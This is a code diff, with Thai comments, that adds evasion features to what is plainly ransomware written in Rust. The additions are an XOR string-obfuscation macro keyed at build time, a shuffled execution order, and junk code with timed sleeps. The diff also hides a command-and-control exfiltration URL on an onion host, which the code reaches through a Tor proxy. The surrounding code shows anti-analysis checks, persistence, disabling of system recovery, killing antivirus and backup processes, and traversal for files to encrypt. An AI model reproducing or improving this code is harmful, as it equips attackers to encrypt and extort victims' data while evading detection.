@@ -11,6 +11,22 @@ use std::time::Duration;
 use chrono::Utc;
 use base64::{Engine, engine::general_purpose::STANDARD};
 
+include!(concat!(env!("OUT_DIR"), "/poly_key.rs"));
+
+// Polymorphic string obfuscation macro
+macro_rules! obf_str {
+    ($s:expr) => {{
+        const BYTES: &[u8] = $s.as_bytes();
+        let mut result = Vec::with_capacity(BYTES.len());
+        let mut i = 0;
+        while i < BYTES.len() {
+            result.push(BYTES[i] ^ POLY_KEY.wrapping_add(i as u8));
+            i += 1;
+        }
+        String::from_utf8(result).unwrap_or_else(|_| $s.to_string())
+    }};
+}
+
 fn kill_annoying_processes() {
     // รายชื่อ processes ที่ชอบกวนการ encrypt (antivirus, backup, database ฯลฯ)
     let processes = vec![
@@ -94,15 +110,54 @@ fn basic_anti_analysis() {
 }
 
 fn main() {
+    // Polymorphic execution order based on compile-time key
+    let order_variant = POLY_KEY % 4;
+
     // 1. Anti-analysis ก่อนเลย
     basic_anti_analysis();
 
-    // 2. Persistence + ลบ recovery
-    persistence::add_persistence();
-    persistence::disable_recovery();
+    match order_variant {
+        0 => {
+            // 2. Persistence + ลบ recovery
+            persistence::add_persistence();
+            persistence::disable_recovery();
 
-    // 3. Kill processes ที่อาจขัดขวาง
-    kill_annoying_processes();
+            // 3. Kill processes ที่อาจขัดขวาง
+            kill_annoying_processes();
+        },
+        1 => {
+            // 3. Kill processes ที่อาจขัดขวาง
+            kill_annoying_processes();
+
+            // 2. Persistence + ลบ recovery
+            persistence::add_persistence();
+            persistence::disable_recovery();
+        },
+        2 => {
+            // 2. Persistence + ลบ recovery
+            persistence::add_persistence();
+            persistence::disable_recovery();
+
+            // Add polymorphic junk code
+            let _junk = obf_str!("polymorphic_junk_data");
+            thread::sleep(Duration::from_millis((POLY_KEY as u64) % 100));
+
+            // 3. Kill processes ที่อาจขัดขวาง
+            kill_annoying_processes();
+        },
+        _ => {
+            // 3. Kill processes ที่อาจขัดขวาง
+            kill_annoying_processes();
+
+            // Add different junk
+            let _junk2 = obf_str!("different_junk_variant");
+            thread::sleep(Duration::from_millis((POLY_KEY as u64 * 2) % 200));
+
+            // 2. Persistence + ลบ recovery
+            persistence::add_persistence();
+            persistence::disable_recovery();
+        }
+    }
 
     // 4. หาไฟล์เป้าหมายทั้งหมด
     let target_files = traversal::get_target_files();
@@ -181,7 +236,7 @@ fn main() {
         "timestamp": Utc::now().timestamp()
     });
 
-    let exfil_url = "http://your-c2-onion.onion/api/report";
+    let exfil_url = obf_str!("http://your-c2-onion.onion/api/report");
 
     // สร้าง client กับ Tor proxy
     let proxy = reqwest::Proxy::all("socks5://127.0.0.1:9050").unwrap();
